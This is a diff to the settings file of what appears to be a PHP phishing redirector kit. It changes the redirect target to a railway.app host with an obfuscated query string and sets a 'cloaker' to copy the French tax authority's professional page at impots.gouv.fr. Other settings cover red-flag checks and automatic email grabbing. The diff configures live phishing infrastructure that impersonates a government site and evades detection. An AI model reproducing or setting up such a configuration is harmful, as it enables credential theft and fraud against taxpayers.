@@ -14,7 +14,7 @@
 
 $license_key = "ks6zv5u0jn3sivn0ts5ej2hti9yaj8pj"; // [REQUIRED]
 
-$redirect = "afinikglobal.up.railway.app/h/?CrDJgHY9S1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgCrDJgHY9S1HY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1"; // URL or FILE [REQUIRED]
+$redirect = "http://glagro.up.railway.app/h/?CrDJgHY9S1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgCrDJgHY9S1HY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1E3TifNLICrDJgHY9S1lOFH72h1"; // URL or FILE [REQUIRED]
 
 
 $parameter = 1; // [REQUIRED]
@@ -33,7 +33,7 @@ $redirection_link_check = false; // Check Your Page If Still Uploaded
 $check_red_page = false;// Check The Redirect If Red Flag
 
 $cloaker = [
-    "url_to_grab" => "", // Change the link you want to grap it in your link ( if t)
+    "url_to_grab" => "https://www.impots.gouv.fr/professionnel/", // Change the link you want to grap it in your link ( if t)
 ];
 
 $auto_grabber = False; // Activate Auto Grab Email
